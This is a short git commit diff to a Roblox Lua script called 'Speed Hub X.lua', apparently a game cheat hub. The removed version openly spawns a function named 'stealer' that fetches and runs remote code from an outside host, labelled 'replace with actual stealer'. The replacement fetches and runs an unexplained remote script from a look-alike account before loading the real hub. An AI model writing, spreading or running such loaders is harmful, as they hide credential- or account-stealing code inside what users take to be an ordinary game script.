9cfa6911be5460b52d4af2e2a885ede2852e366d
AhmadV90 <scriptgenerator0@gmail.com>
2025-08-21 09:16:53 +0800

    Update Speed Hub X.lua

--- Speed Hub X.lua
+++ Speed Hub X.lua
@@ -1,12 +1,2 @@
-local function stealer()
-
-ID="924ff74c-8373-448f-83de-61a4c24eca6c";
-loadstring(game:HttpGet("https://cdn.reverse.software/loader.luau"))()  -- replace with actual stealer
-end
-local function loadui()
-  loadstring(game:HttpGet("https://raw.githubusercontent.com/AhmadV99/Speed-Hub-X/main/Speed%20Hub%20X.lua", true))()
-
-end
-
-task.spawn(stealer)
-task.spawn(loadui)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/AhmadV90/Speed-Hub-X/refs/heads/main/Bloxified"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/AhmadV99/Speed-Hub-X/main/Speed%20Hub%20X.lua", true))()
